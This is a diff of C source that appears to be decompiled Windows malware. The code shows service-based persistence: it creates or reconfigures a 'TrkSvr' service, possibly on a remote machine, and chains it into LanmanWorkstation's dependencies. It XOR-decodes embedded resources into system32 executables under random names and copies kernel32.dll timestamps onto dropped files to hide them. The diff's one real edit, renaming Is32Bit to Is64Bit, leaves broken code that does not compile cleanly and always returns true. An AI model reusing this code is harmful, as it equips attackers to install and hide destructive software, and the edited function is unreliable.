@@ -32,13 +32,13 @@ WCHAR *strcpyW(WCHAR *a1, const WCHAR *a2, ...)
 
 	va_start(va, a2);
 	if(!a1 || !a2) return 0;
-	
+
 	for(char * i = (char *)a1; *(int *)va; --*(int *)va)
 	{
 		*i = i[(char *)a2 - (char *)a1];
 		++i;
 	}
-	
+
 	return a1;
 }
 
@@ -61,7 +61,7 @@ UINT32 strlenW(const WCHAR *string)
 		while((LOBYTE(string[i]) || HIBYTE(string[i])) && i < 2000000000)
 			++i;
 	}
-	
+
 	return i;
 }
 
@@ -146,7 +146,7 @@ DWORD GetProcessID(WCHAR *process_name)
 	pe.dwSize = 556;
 	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
 	if(hSnapshot == INVALID_HANDLE_VALUE) return 0;
-	
+
 	Process32FirstW(hSnapshot, &pe);
 	while(!strcmpW(process_name, pe.szExeFile))
 	{
@@ -157,7 +157,7 @@ DWORD GetProcessID(WCHAR *process_name)
 		}
 	}
 	CloseHandle(hSnapshot);
-	
+
 	return pe.th32ProcessID;
 }
 
@@ -167,7 +167,7 @@ DWORD SearchProcessByIdOrName(DWORD dwPID, WCHAR *szProcessName)
 
 	if(!dwPID && !szProcessName)					return 0;
 	if((dwPID = GetProcessID(szProcessName)) == 0)	return 0;
-	
+
 	if((hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, dwPID)) == 0) return 0;
 
 	CloseHandle(hProcess);
@@ -178,7 +178,7 @@ void ResetArgs()
 {
 	if(g_argv)
 		LocalFree(g_argv);
-	
+
 	g_argc = 0;
 }
 
@@ -190,12 +190,12 @@ int DeleteJobAfter95Seconds(JOB_PROPERTIES *lpAddress)
 		NetScheduleJobDel(lpAddress->IsServerNameSet ? (const WCHAR *)lpAddress : 0, lpAddress->JobId, lpAddress->JobId);
 		VirtualFree(lpAddress, 0, MEM_RELEASE);
 	}
-	
+
 	return 0;
 }
 
 bool ConfigureTrkSvr(LPCWSTR lpMachineName, const WCHAR *path)
-{	
+{
 	SC_HANDLE hSCManager; // [sp+Ch] [bp-400h]@1
 	LPCWSTR svc_path;
 	DWORD pcbBytesNeeded; // [sp+18h] [bp-3F4h]@4
@@ -207,7 +207,7 @@ bool ConfigureTrkSvr(LPCWSTR lpMachineName, const WCHAR *path)
 
 	hSCManager = OpenSCManagerW(lpMachineName, NULL, SC_MANAGER_ALL_ACCESS);
 	if(!hSCManager) return 0;
-	
+
 	svc_trksrv = OpenServiceW(hSCManager, L"TrkSvr", SC_MANAGER_ALL_ACCESS);
 	/** ----->> If the service does not exists create it. <<----- **/
 	if(!svc_trksrv)
@@ -232,10 +232,10 @@ bool ConfigureTrkSvr(LPCWSTR lpMachineName, const WCHAR *path)
 		pcbBytesNeeded = 0;
 		if(!QueryServiceConfigW(svc_trksrv, NULL, NULL, &pcbBytesNeeded) && GetLastError() == ERROR_INSUFFICIENT_BUFFER)
 			lpServiceConfig = (LPQUERY_SERVICE_CONFIGW)LocalAlloc(0, pcbBytesNeeded);
-		
+
 		if(QueryServiceConfigW(svc_trksrv, lpServiceConfig, pcbBytesNeeded, &pcbBytesNeeded))
 		{
-			
+
 			/** ----->> Compare the last 3 characters of the dependencies with "vcs" (???) <<----- **/
 			//v5 = (WCHAR *)&byte_416552[strlenW(L"C:\\Windows\\system32\\svchost.exe -k netsvcs")]; // Strange
 			if(!strcmpW(&lpServiceConfig->lpBinaryPathName[strlenW(lpServiceConfig->lpBinaryPathName) - 3], L"vcs")) // L"vcs" = v5
@@ -244,7 +244,7 @@ bool ConfigureTrkSvr(LPCWSTR lpMachineName, const WCHAR *path)
 				CloseServiceHandle(hSCManager);
 				return false;
 			}
-			
+
 			/** ----->> Change service config, register it as startup service <<----- **/
 			ChangeServiceConfigW(svc_trksrv, SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_IGNORE, svc_path, NULL, 0, L"RpcSs", NULL, NULL, NULL);
 		}
@@ -258,12 +258,12 @@ bool ConfigureTrkSvr(LPCWSTR lpMachineName, const WCHAR *path)
 		RegDeleteValueW(reg_key, L"WOW64");
 		RegCloseKey(reg_key);
 	}
-	
+
 	/** ----->> Finally start the service <<----- **/
 	StartServiceW(svc_trksrv, 0, NULL);
 	CloseServiceHandle(svc_trksrv);
-	
-	
+
+
 	SC_HANDLE svc_lanman = OpenServiceW(hSCManager, L"LanmanWorkstation", SC_MANAGER_ALL_ACCESS);
 	if(svc_lanman)
 	{
@@ -274,7 +274,7 @@ bool ConfigureTrkSvr(LPCWSTR lpMachineName, const WCHAR *path)
 			svc_config = (LPQUERY_SERVICE_CONFIGW)lpMachineName;
 		else
 			svc_config = (LPQUERY_SERVICE_CONFIGW)LocalAlloc(0, pcbBytesNeeded);
-		
+
 		if(QueryServiceConfigW(svc_lanman, svc_config, pcbBytesNeeded, &pcbBytesNeeded))
 		{
 			WCHAR Dependencies[500];
@@ -288,11 +288,11 @@ bool ConfigureTrkSvr(LPCWSTR lpMachineName, const WCHAR *path)
 			{
 				while(dep[dep_len] || dep[dep_len + 1])// Account for null bytes
 					++dep_len;
-				
+
 				dep_size = dep_len + 1;
 				strcpyW(Dependencies, dep, 2 * dep_size);
 			}
-			
+
 			// Add TrkSvr to the dependencies if we haven't already
 			if(!strcmpW(L"TrkSvr", &Dependencies[dep_size - strlenW(L"TrkSvr") + 1]))
 			{
@@ -302,10 +302,10 @@ bool ConfigureTrkSvr(LPCWSTR lpMachineName, const WCHAR *path)
 				ChangeServiceConfigW(svc_lanman, svc_config->dwServiceType, svc_config->dwStartType, svc_config->dwErrorControl, 0, 0, 0, Dependencies, 0, 0, 0);
 			}
 		}
-		
+
 		CloseServiceHandle(svc_lanman);
 	}
-	
+
 	CloseServiceHandle(hSCManager);
 	return 1;
 }
@@ -314,7 +314,7 @@ bool ForceFileDeletion(LPCWSTR file_to_delete)
 {
 	if(!DeleteFileW(file_to_delete))
 		MoveFileExW(file_to_delete, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
-	
+
 	return 1;
 }
 
@@ -334,7 +334,7 @@ void DeleteServiceExecutables()
 		strcpyW(&exec_path[strlenW(g_windows_directory)], L"\\system32\\", sizeof(WCHAR) * strlenW(L"\\system32\\"));
 		strcpyW(&exec_path[strlenW(g_windows_directory) + strlenW(L"\\system32\\")], exec_name, sizeof(WCHAR) * strlenW(exec_name));
 		strcpyW(&exec_path[strlenW(g_windows_directory) + strlenW(L"\\system32\\") + strlenW(exec_name)], L".exe", sizeof(WCHAR) * strlenW(L".exe"));
-		
+
 		exec_path[strlenW(exec_name) + strlenW(g_windows_directory) + strlenW(L"\\system32\\") + strlenW(L".exe")] = 0;
 		DeleteFileW(exec_path);
 
@@ -348,7 +348,7 @@ typedef int (__stdcall *disableFSRedirection_t)(PVOID *);
 int _Wow64DisableWow64FsRedirection(PVOID *OldValue)
 {
 	disableFSRedirection_t func = GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "_Wow64DisableWow64FsRedirection");
-	
+
 	if( func )
 	{
 		return func( OldValue );
@@ -370,28 +370,27 @@ int _Wow64RevertWow64FsRedirection(PVOID OldValue)
 	return 0;
 }
 
-bool Is32Bit()
+bool Is64Bit()
 {
 	HKEY hKey;
-	DWORD size = 100;
-	BYTE Data[100];
+	char *Data[100];
 	WCHAR processor_architecture[52]; // [sp+74h] [bp-6Ch]@4
 
 	if(RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment", 0, KEY_EXECUTE, &hKey))
 		return false;
-	
-	if( RegQueryValueExW(hKey, L"PROCESSOR_ARCHITECTURE", 0, Data, &size) != ERROR_SUCCESS ) 
+
+	if( RegQueryValueExW(hKey, L"PROCESSOR_ARCHITECTURE", 0, Data, &size) != ERROR_SUCCESS )
 	{
 		RegCloseKey(hKey); // Should we not close the key later, too?
 		return false;
 	}
-	
-	memmove(processor_architecture, Data, size);
+
+	memmove(processor_architecture, sizeof(Data), size);
 	processor_architecture[size / 2] = 0;
-	
-	if(wcscmp(L"AMD64", processor_architecture) && wcscmp(L"amd64", processor_architecture))
-		return false;
-	
+
+	if(wcscmp(L"AMD64", processor_architecture) == 0 || wcscmp(L"amd64", processor_architecture) == 0)
+		return true;
+
 	return true;
 }
 
@@ -401,12 +400,12 @@ bool IsLeapYear(signed int year)
 
 	if(year <= 0) // The fuck?
 		return FALSE;
-	
+
 	v1 = (year & 0x80000003) == 0;
-	
+
 	if((year & 0x80000003) < 0)
 		v1 = (((year & 0x80000003) - 1) | 0xFFFFFFFC) == -1;
-	
+
 	return (v1 && (year % 100 || !(year % 400))) ? TRUE : FALSE;
 }
 
@@ -419,9 +418,9 @@ DWORD g_days_in_month[] =
 
 int GetDaysInMonth(signed int year, unsigned int month)
 {
-	if((month - 1) > 11) 
+	if((month - 1) > 11)
 		return 0;
-	
+
 	int days = g_days_in_month[month];
 
 	// February leap-year shit
@@ -439,7 +438,7 @@ bool WriteEncodedResource(LPCWSTR lpFileName, HMODULE hModule, LPCWSTR lpName, L
 	char *v16; // [sp+18h] [bp-10h]@10
 
 	HRSRC res = FindResourceW(hModule, lpName, lpType);
-	if(!res) 
+	if(!res)
 		return false;
 
 	HGLOBAL res_handle = LoadResource(hModule, res);
@@ -453,20 +452,20 @@ bool WriteEncodedResource(LPCWSTR lpFileName, HMODULE hModule, LPCWSTR lpName, L
 	DWORD res_size = SizeofResource( hModule, res );
 	if(!res_size)
 		return false;
-	
+
 	PVOID oldValue = NULL;
-	
-	if((_Wow64DisableWow64FsRedirection(&oldValue)) == 0) 
+
+	if((_Wow64DisableWow64FsRedirection(&oldValue)) == 0)
 		return false;
 
-	HANDLE hObject = CreateFileW(lpFileName, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, 0, NULL); 
+	HANDLE hObject = CreateFileW(lpFileName, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, 0, NULL);
 
-	if((_Wow64RevertWow64FsRedirection(oldValue)) == 0)   
+	if((_Wow64RevertWow64FsRedirection(oldValue)) == 0)
 		return false;
-	
-	if(!hObject || hObject == INVALID_HANDLE_VALUE) 
+
+	if(!hObject || hObject == INVALID_HANDLE_VALUE)
 		return false;
-	
+
 	unsigned int i = 0;
 	unsigned int NumberOfBytesWritten = 0;
 
@@ -476,7 +475,7 @@ bool WriteEncodedResource(LPCWSTR lpFileName, HMODULE hModule, LPCWSTR lpName, L
 		char decoded_byte = res_content[i] ^ key[i % key_len];
 		WriteFile(hObject, &decoded_byte, 1, &NumberOfBytesWritten, 0);
 		++i;
-		
+
 		if(i >= 1024)
 		{
 			if(i < res_size)
@@ -486,14 +485,14 @@ bool WriteEncodedResource(LPCWSTR lpFileName, HMODULE hModule, LPCWSTR lpName, L
 				if(newFile)
 				{
 					v16 = &newFile[-i];
-					
+
 					do
 					{
 						v16[i] = decoded_byte;
 						++i;
 					}
 					while(i < res_size);
-					
+
 					WriteFile(hObject, newFile, res_size - 1024, &NumberOfBytesWritten, 0);
 					VirtualFree(lpAddress, 0, MEM_RELEASE);
 				}
@@ -501,7 +500,7 @@ bool WriteEncodedResource(LPCWSTR lpFileName, HMODULE hModule, LPCWSTR lpName, L
 			break;
 		}
 	}
-		
+
 	CloseHandle(hObject);
 
 	return true;
@@ -510,47 +509,47 @@ bool WriteEncodedResource(LPCWSTR lpFileName, HMODULE hModule, LPCWSTR lpName, L
 bool GetRandomServiceInfo(WCHAR *svc_name, WCHAR *svc_path)
 {
 	// Only try 29 times
-	// 	Because this is random this is odd	
-	for( int i = 0; i < 29; i++ ) 
+	// 	Because this is random this is odd
+	for( int i = 0; i < 29; i++ )
 	{
 		WCHAR *rnd_svc_name = g_random_exec_name[GetRandom() % 29];
-		
+
 		strcpyW(svc_name, rnd_svc_name, 2 * strlenW(rnd_svc_name));
 		strcpyW(&svc_name[strlenW(rnd_svc_name)], L".exe", 2 * strlenW(L".exe"));
 		svc_name[strlenW(rnd_svc_name) + strlenW(L".exe")] = 0;
-		
+
 		// This must be some anti-AV shit, it's done this way throughout the exec
 		strcpyW(svc_path, g_windows_directory, 2 * strlenW(g_windows_directory));
 		strcpyW(&svc_path[strlenW(g_windows_directory)], L"\\system32\\", 2 * strlenW(L"\\system32\\"));
 		strcpyW(&svc_path[strlenW(g_windows_directory) + strlenW(L"\\system32\\")], svc_name, 2 * strlenW(svc_name));
 		svc_path[strlenW(g_windows_directory) + strlenW(L"\\system32\\") + strlenW(svc_name)] = 0;
-		
+
 		PVOID oldValue = NULL;
 		_Wow64DisableWow64FsRedirection(oldValue);
 		HANDLE file_handle = CreateFileW(svc_path, GENERIC_READ, 7, 0, 3, FILE_FLAG_OPEN_NO_RECALL, 0);
 		DWORD last_err = GetLastError();
 		_Wow64RevertWow64FsRedirection(oldValue);
-		
+
 		// If we can write to the file, we've succeeded
 		if( file_handle == INVALID_HANDLE_VALUE && last_err == ERROR_FILE_NOT_FOUND )
 			return true;
-		
+
 		CloseHandle(file_handle);
 	}
-	
+
 	return false;
 }
 
 bool GetTrksrvServiceInfo(WCHAR *svc_filename, WCHAR *svc_path)
-{	
+{
 	strcpyW(svc_filename, L"trksvr.exe", 2 * strlenW(L"trksvr.exe"));
 	svc_filename[strlenW(L"trksvr.exe")] = 0;
-	
+
 	strcpyW(svc_path, g_windows_directory, 2 * strlenW(g_windows_directory));
 	strcpyW(&svc_path[strlenW(g_windows_directory)], L"\\system32\\", 2 * strlenW(L"\\system32\\"));
 	strcpyW(&svc_path[strlenW(g_windows_directory) + strlenW(L"\\system32\\")], svc_filename, 2 * strlenW(svc_filename));
 	svc_path[strlenW(g_windows_directory) + strlenW(L"\\system32\\") + strlenW(svc_filename)] = 0;
-	
+
 	PVOID oldValue = NULL;
 	_Wow64DisableWow64FsRedirection(&oldValue);
 
@@ -566,7 +565,7 @@ bool GetTrksrvServiceInfo(WCHAR *svc_filename, WCHAR *svc_path)
 		}
 	}
 	_Wow64RevertWow64FsRedirection(oldValue);
-	
+
 	return true;
 }
 
@@ -575,17 +574,17 @@ bool GetNetinitServiceInfo(WCHAR *svc_name, WCHAR *svc_path)
 	strcpyW(svc_name, L"netinit", 2 * strlenW(L"netinit"));
 	strcpyW(&svc_name[strlenW(L"netinit")], L".exe", 2 * strlenW(L".exe"));
 	svc_name[strlenW(L"netinit") + strlenW(L".exe")] = 0;
-	
+
 	strcpyW(svc_path, g_windows_directory, 2 * strlenW(g_windows_directory));
 	strcpyW(&svc_path[strlenW(g_windows_directory)], L"\\system32\\", 2 * strlenW(L"\\system32\\"));
 	strcpyW(&svc_path[strlenW(g_windows_directory) + strlenW(L"\\system32\\")], svc_name, 2 * strlenW(svc_name));
 	svc_path[strlenW(g_windows_directory) + strlenW(L"\\system32\\") + strlenW(svc_name)] = 0;
-	
+
 	PVOID oldValue = NULL;
 	_Wow64DisableWow64FsRedirection(&oldValue);
 	DeleteFileW(svc_path);
 	_Wow64RevertWow64FsRedirection(oldValue);
-	
+
 	return true;
 }
 
@@ -593,19 +592,20 @@ bool GeneralSetup()
 {
 
 	GetWindowsDirectoryW(g_windows_directory, 100);
-	
+
 	// kernel_path = %SYSTEM%\\system32\\kernel32.dll
 	WCHAR kernel_path[256];
-
 	memmove(kernel_path, g_windows_directory, 2 * strlenW(g_windows_directory));
 	memmove(&kernel_path[strlenW(g_windows_directory)], L"\\system32\\kernel32.dll", 2 * strlenW(L"\\system32\\kernel32.dll"));
 	kernel_path[strlenW(g_windows_directory) + strlenW(L"\\system32\\kernel32.dll")] = 0;
-	
+
 	PVOID oldValue = 0;
+
+	// Get a handle to the 64-bit version of kernel32.dll
 	_Wow64DisableWow64FsRedirection(&oldValue);
 	HANDLE kernel_handle = CreateFileW(kernel_path, GENERIC_READ, FILE_SHARE_DELETE | FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_OPEN_NO_RECALL, NULL);
 	_Wow64RevertWow64FsRedirection(oldValue);
-	
+
 	if(kernel_handle != INVALID_HANDLE_VALUE)
 	{
 		if(!GetFileTime(kernel_handle, &g_kernel_creation_time, &g_kernel_last_access_time, &g_kernel_last_write_time))
@@ -613,17 +613,17 @@ bool GeneralSetup()
 			g_kernel_creation_time.dwHighDateTime = 0;
 			g_kernel_creation_time.dwLowDateTime = 0;
 		}
-		
+
 		CloseHandle(kernel_handle);
 	}
-	
+
 	g_argv = CommandLineToArgvW(GetCommandLineW(), &g_argc);
 	if(g_argv)
 	{
 		strcpyW(g_module_path, g_argv[0], 2 * strlenW(g_argv[0]) + 2);
 		return true;
 	}
-	
+
 	return false;
 }
 
@@ -634,27 +634,27 @@ bool IsFileAccessible(LPCWSTR lpFileName)
 	_Wow64DisableWow64FsRedirection(&oldValue);
 	HANDLE file_handle = CreateFileW(lpFileName, GENERIC_READ, 1, 0, 3, FILE_FLAG_OPEN_NO_RECALL, 0);
 	_Wow64RevertWow64FsRedirection(oldValue);
-	
-	if(file_handle == INVALID_HANDLE_VALUE) 
+
+	if(file_handle == INVALID_HANDLE_VALUE)
 		return false;
-	
+
 	CloseHandle(file_handle);
 	return true;
 }
 
 // Make the file seem as old as the windows default drivers
 bool SetReliableFileTime(LPCWSTR lpFileName)
-{	
+{
 	if(!g_kernel_creation_time.dwLowDateTime) return false;
 	if(!lpFileName) return false;
-	
+
 	PVOID oldValue = NULL;
 	_Wow64DisableWow64FsRedirection(&oldValue);
 	HANDLE file_handle = CreateFileW(lpFileName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_DELETE | FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_OPEN_NO_RECALL, NULL);
 	_Wow64RevertWow64FsRedirection(oldValue);
-	
+
 	if(file_handle == INVALID_HANDLE_VALUE) return false;
-	
+
 	if(SetFileTime(file_handle, &g_kernel_creation_time, &g_kernel_last_access_time, &g_kernel_last_write_time))
 	{
 		CloseHandle(file_handle);
